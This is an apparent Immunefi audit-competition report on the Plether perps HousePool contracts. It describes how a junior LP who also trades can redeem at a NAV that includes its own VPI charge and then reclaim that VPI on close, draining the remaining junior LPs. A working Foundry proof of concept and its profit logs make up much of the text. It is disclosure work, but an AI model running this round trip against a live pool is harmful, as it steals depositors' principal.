# \#98549 [SC-Critical] Junior LP who also trades captures its own VPI charge as LP NAV on exit and gets it refunded on close, paid by the remaining junior LPs

**Submitted on Nov 8th 2026 at 16:33:05 UTC by @kujen for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98549
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
Positive VPI is booked into junior LP principal the moment it is paid, while the refund the same position collects on a skew-reducing close is not reserved anywhere. The lifetime clamp in `CloseAccountingLib.sol` stops a trader from getting back more than it paid, but it does not stop an account that is also a junior LP from redeeming its shares at a NAV that already contains its own VPI and then closing to take the VPI back. In my PoC at the shipped economics, one round trip nets the attacker +3,079 USDC after all fees and carry and costs a 1M junior LP 4,573 USDC (45.7 bps of its principal). The pool never enters degraded mode, so the loop repeats every LP epoch cycle.

## Vulnerability Details
1. On open, the VPI charge lands in pool cash in full. `CfdEngineSettlementSidecar.sol:448-457` routes `tradeCostAssets - protocolFeeCredited` into the pool; the PoC asserts `pool.totalAssets()` rises by exactly `vpiAccrued`.
2. At the next reconcile that cash is surplus over claimed equity, so `HousePoolWaterfallAccountingLib.planReconcile` (`:99-111`) books it as revenue and `distributeRevenue` (`:141-160`) credits all of it to `juniorPrincipal` (senior only takes its coupon). Junior share price, and therefore the redemption value at `HousePool.settleLpEpoch` (`HousePool.sol:798`), includes the attacker's VPI immediately.
3. The withdrawal firewall (`SECURITY.md:343`, base reserve `C + L + B`) does not reserve the outstanding refund either; the harness already shows free cash grows by exactly the VPI charge.
4. On close, `CloseAccountingLib.buildCloseState` computes the skew-reducing VPI at the post-exit depth, which is larger than what was paid, and then clamps it to `-proportionalAccrual` (`CloseAccountingLib.sol:113-119`). The clamp is the only cap, and the comment says it "Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes". The rebate is then paid from pool cash free of trader claims only (`CfdEnginePlanLib.sol:968-978`).
5. The LP who exited already took its share of that VPI. The refund comes out of whoever is still in the junior tranche (`absorbLoss` is junior-first, `HousePoolWaterfallAccountingLib.sol:168-186`).

Net: the attacker's trader leg breaks even on VPI and pays only execution fees and carry; its LP leg keeps `share x VPI`. Once its junior share exceeds `fees / VPI` (0.4 when the open takes skew from 0 to the 40% cap; lower when same-side skew already exists), the round trip is profitable, and the profit is paid by the remaining junior LPs.

## Impact Details
The stolen value is deposited junior LP principal held by `HousePool`. The PoC runs the same pool twice, once with the attacker's trade and once without it (control), and compares the outcomes.

At shipped release values (vpiFactor 1e16, maxSkewRatio 0.4, executionFee 4 bps, maxSeniorShareBps 8000), basket price 1.0, pool 3.6M senior + 1M junior (victim) + 5M junior (attacker), balanced 0.5M/0.5M book:
```
- the attacker's short of 3,744,780 USDC notional pays 7,302.01 USDC of VPI on open;
- the attacker's junior exit is fully funded and returns 6,083.99 USDC more than the same exit in the control run;
- the close refunds the VPI from pool cash (5,795.21 USDC paid out); the attacker's trader leg nets -3,004.68 USDC after fees and carry;
```
- attacker net: +3,079.31 USDC; remaining junior LP: -4,572.62 USDC; senior LPs unaffected; `degradedMode` stays false.

This is theft of principal, not of yield. In the control run no VPI exists at all, and the remaining junior LP still ends 4,572.62 USDC lower in the attack run, so the loss comes out of the funds it deposited. The attacker leaves with a positive net transfer taken from that LP. Senior holders are untouched because the junior tranche absorbs the refund first (`HousePoolWaterfallAccountingLib.sol:168-186`).

Precondition: the attacker holds a large junior position. The round trip is profitable once its junior share exceeds `fees / VPI`, about 40% when the open moves skew from zero to the 40% cap, and lower when same-side skew already exists. No capital is at risk: the attacker's LP leg is fully redeemed in the same cycle. Each cycle needs only an LP epoch plus the re-deposit cooldown (about 2 hours), so a large junior holder repeats it several times a day, and every repetition costs the other junior holders about 0.46% of their principal at these sizes.


## References
- `packages/perps/src/HousePool.sol:798-822`, `:1205-1217`
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:99-186`
- `packages/perps/src/libraries/CloseAccountingLib.sol:13`, `:104-119`
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:940-978`
- `packages/perps/src/CfdEngineSettlementSidecar.sol:448-457`
- `packages/perps/WHITEPAPER.md:887-890`
- `deployments/releases/2026-10-12-perps-arbitrum-sepolia-v1.3.1/manifest.json` (economics block)

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {VpiMockSettlementToken6} from "../shared/CfdEngineTestBase.sol";

contract PoC_E_VpiLpRoundTrip is Test {

    VpiMockSettlementToken6 settlementToken;
    CfdEngine engine;
    HousePool pool;
    TrancheVault juniorVault;
    TrancheVault seniorVault;
    MarginClearinghouse clearinghouse;

    uint256 constant CAP_PRICE = 2e8;
    // normalized basket near its 10y mean (0.86 - 1.12 range, mean 1.007)
    uint256 constant PRICE = 1e8;

    uint256 constant SENIOR_VICTIM_DEPOSIT = 3_600_000 * 1e6;
    uint256 constant JUNIOR_VICTIM_DEPOSIT = 1_000_000 * 1e6;
    uint256 constant ATTACKER_LP_DEPOSIT = 5_000_000 * 1e6;
    uint256 constant ATTACKER_MARGIN = 200_000 * 1e6;

    address constant LONG_BOOK = address(0x1B);
    address constant SHORT_BOOK = address(0x5B);
    address constant ATTACKER = address(0xA7);
    address constant JUNIOR_VICTIM = address(0x1D);
    address constant SENIOR_VICTIM = address(0x5E);

    struct Outcome {
        uint256 depthAtOpen;
        uint256 attackerNotional;
        uint256 attackerLpOut;
        uint256 attackerSharesLeft;
        int256 attackerTraderPnl;
        uint256 juniorVictimOut;
        uint256 seniorVictimValue;
        uint256 vpiPaid;
        uint256 refund;
        bool degraded;
    }

    function getAccountReservations(
        address
    ) external pure returns (IOrderRouterAccounting.AccountReservationView memory reservation) {
        return reservation;
    }

    function getMarginReservationIds(
        address
    ) external pure returns (uint64[] memory) {
        return new uint64[](0);
    }

    function syncMarginQueue(
        address
    ) external pure {}

    // arbitrum-sepolia release v1.3.1 economics
    function _riskParams() internal pure returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 1e16,
            maxSkewRatio: 4e17,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _configureShippedSeniorCapacity() internal {
        IHousePool.PoolConfig memory config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: 40_000_000 * 1e6,
            maxSeniorShareBps: 8000
        });
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function setUp() public {
        settlementToken = new VpiMockSettlementToken6();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = new CfdEngine(address(settlementToken), address(clearinghouse), CAP_PRICE, _riskParams(), 50);
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));
        TerminalNavBookV2 terminalBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalBook));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));
        engine.setOrderRouter(address(this));
        clearinghouse.setEngine(address(engine));
        _configureShippedSeniorCapacity();
        vm.warp(1_709_532_000);

        settlementToken.mint(address(this), 2000e6);
        settlementToken.approve(address(pool), 2000e6);
        pool.initializeSeedPosition(false, 1000e6, address(this));
        pool.initializeSeedPosition(true, 1000e6, address(this));
        pool.activateTrading();

        _seedLp(juniorVault, JUNIOR_VICTIM, JUNIOR_VICTIM_DEPOSIT);
        _seedLp(juniorVault, ATTACKER, ATTACKER_LP_DEPOSIT);
        _seedLp(seniorVault, SENIOR_VICTIM, SENIOR_VICTIM_DEPOSIT);

        _warpAndRefreshMark(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);

        // an ordinary, balanced book already trading
        _deposit(LONG_BOOK, 100_000 * 1e6);
        _open(LONG_BOOK, CfdTypes.Side.LONG, _sizeForNotional(500_000 * 1e6), 50_000 * 1e6);
        _deposit(SHORT_BOOK, 100_000 * 1e6);
        _open(SHORT_BOOK, CfdTypes.Side.SHORT, _sizeForNotional(500_000 * 1e6), 50_000 * 1e6);
    }

    function _seedLp(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), type(uint256).max);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(requestId));
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
        pool.settleLpEpoch(0, 0);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _warpAndRefreshMark(
        uint256 timestamp
    ) internal {
        if (timestamp > block.timestamp) {
            vm.warp(timestamp);
        }
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
    }

    function _deposit(
        address account,
        uint256 amount
    ) internal {
        settlementToken.mint(account, amount);
        vm.startPrank(account);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _sizeForNotional(
        uint256 notionalAtoms
    ) internal pure returns (uint256) {
        return (notionalAtoms / PRICE) * CfdTypes.SIZE_QUANTUM;
    }

    function _order(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (CfdTypes.Order memory) {
        return CfdTypes.Order({
            account: account,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? 0 : PRICE,
            commitTime: uint64(block.timestamp),
            commitBlock: uint64(block.number),
            orderId: 0,
            side: side,
            isClose: isClose
        });
    }

    function _open(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        engine.processOrderTyped(
            _order(account, side, size, margin, false), PRICE, pool.totalAssets(), uint64(block.timestamp)
        );
    }

    function _close(
        address account,
        CfdTypes.Side side,
        uint256 size
    ) internal {
        engine.processOrderTyped(
            _order(account, side, size, 0, true), PRICE, pool.totalAssets(), uint64(block.timestamp)
        );
    }

    function _redeemAll(
        TrancheVault vault,
        address lp
    ) internal returns (uint256 assetsOut, uint256 sharesLeft) {
        uint256 shares = vault.balanceOf(lp);
        vm.prank(lp);
        uint256 redeemId = vault.requestRedeem(shares, lp, lp);
        _warpAndRefreshMark(pool.lpEpochStart(redeemId));
        pool.settleLpEpoch(PRICE, block.timestamp);
        uint256 claimable = vault.claimableRedeemRequest(redeemId, lp);
        uint256 before = settlementToken.balanceOf(lp);
        if (claimable > 0) {
            vm.prank(lp);
            vault.claimRedeem(redeemId, claimable, lp, lp);
        }
        assetsOut = settlementToken.balanceOf(lp) - before;
        sharesLeft = shares - claimable;
    }

    function _depth() internal view returns (uint256) {
        uint256 physical = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return physical > claims ? physical - claims : 0;
    }

    // identical timeline in both branches; the only difference is the attacker's open/close round trip
    function _scenario(
        bool attack
    ) internal returns (Outcome memory o) {
        uint256 attackerSize;
        uint256 traderBefore;
        o.depthAtOpen = _depth();
        if (attack) {
            _deposit(ATTACKER, ATTACKER_MARGIN);
            traderBefore = clearinghouse.balanceAssets(ATTACKER);
            // fill the skew band left by the balanced book, just under maxSkewRatio x depth
            o.attackerNotional = (o.depthAtOpen * 39) / 100;
            attackerSize = _sizeForNotional(o.attackerNotional);
            uint256 poolBeforeOpen = pool.totalAssets();
            _open(ATTACKER, CfdTypes.Side.SHORT, attackerSize, 100_000 * 1e6);
            (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
            o.vpiPaid = uint256(vpiAccrued);
            assertEq(pool.totalAssets() - poolBeforeOpen, o.vpiPaid, "the whole VPI charge lands in pool cash");
        }

        // attacker leaves the junior tranche at the next epoch mark, position still open
        (o.attackerLpOut, o.attackerSharesLeft) = _redeemAll(juniorVault, ATTACKER);

        if (attack) {
            uint256 poolBeforeClose = pool.totalAssets();
            _close(ATTACKER, CfdTypes.Side.SHORT, attackerSize);
            o.refund = poolBeforeClose - pool.totalAssets();
            o.attackerTraderPnl = int256(clearinghouse.balanceAssets(ATTACKER)) - int256(traderBefore);
        }

        _warpAndRefreshMark(block.timestamp + 1);
        // live projected waterfall value of the junior LP that stayed in the pool
        o.juniorVictimOut = juniorVault.convertToAssets(juniorVault.balanceOf(JUNIOR_VICTIM));
        o.seniorVictimValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_VICTIM));
        o.degraded = engine.degradedMode();
    }

    function test_lpTraderRoundTripStealsJuniorPrincipal() public {
        uint256 snap = vm.snapshotState();
        Outcome memory control = _scenario(false);
        vm.revertToState(snap);
        Outcome memory atk = _scenario(true);

        console2.log("pool depth at attacker open    ", atk.depthAtOpen);
        console2.log("attacker short notional        ", atk.attackerNotional);
        console2.log("vpi paid on open               ", atk.vpiPaid);
        console2.log("pool cash paid out on close    ", atk.refund);
        console2.log("attacker LP out, control       ", control.attackerLpOut);
        console2.log("attacker LP out, attack        ", atk.attackerLpOut);
        console2.log("attacker trader leg pnl        ");
        console2.logInt(atk.attackerTraderPnl);
        console2.log("junior victim value, control   ", control.juniorVictimOut);
        console2.log("junior victim value, attack    ", atk.juniorVictimOut);
        console2.log("senior victim value, control   ", control.seniorVictimValue);
        console2.log("senior victim value, attack    ", atk.seniorVictimValue);

        int256 attackerGain = int256(atk.attackerLpOut) - int256(control.attackerLpOut) + atk.attackerTraderPnl;
        int256 victimLoss = int256(control.juniorVictimOut) - int256(atk.juniorVictimOut);
        console2.log("attacker net gain vs control   ");
        console2.logInt(attackerGain);
        console2.log("junior victim loss vs control  ");
        console2.logInt(victimLoss);

        // both exits fully funded, no attacker shares left behind to absorb the refund
        assertEq(atk.attackerSharesLeft, 0, "attacker junior exit fully funded");
        assertEq(control.attackerSharesLeft, 0, "control junior exit fully funded");
        assertFalse(atk.degraded, "pool never degrades, so nothing stops a repeat");
        // the close hands the trader back what it paid in VPI
        assertGt(atk.refund, atk.vpiPaid / 2, "refund returns most of the VPI charge");
        // the attacker ends richer than not attacking, after fees and carry on both legs
        assertGt(attackerGain, 0, "attacker profits from the round trip");
        assertGe(victimLoss, attackerGain, "remaining junior LP funds the attacker's gain");
        assertGt(victimLoss, int256(JUNIOR_VICTIM_DEPOSIT * 40 / 10_000), "junior LP loses over 40 bps of principal in one round trip");
        assertGe(control.seniorVictimValue, atk.seniorVictimValue, "senior is not the payer here");
    }

}
```


## PoC Output
```text
Ran 1 test for test/perps/poc/PoC_E_VpiLpRoundTrip.t.sol:PoC_E_VpiLpRoundTrip
[PASS] test_lpTraderRoundTripStealsJuniorPrincipal() (gas: 5922104)
Logs:
  pool depth at attacker open     9602000001765
  attacker short notional         3744780000688
  vpi paid on open                7302009001
  pool cash paid out on close     5795209640
  attacker LP out, control        4999945193254
  attacker LP out, attack         5006029186774
  attacker trader leg pnl        
  -3004679361
  junior victim value, control    999989020402
  junior victim value, attack     995416398823
  senior victim value, control    3600065762556
  senior victim value, attack     3600065762556
  attacker net gain vs control   
  3079314159
  junior victim loss vs control  
  4572621579

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 37.23ms (12.21ms CPU time)

Ran 1 test suite in 38.64ms (37.23ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
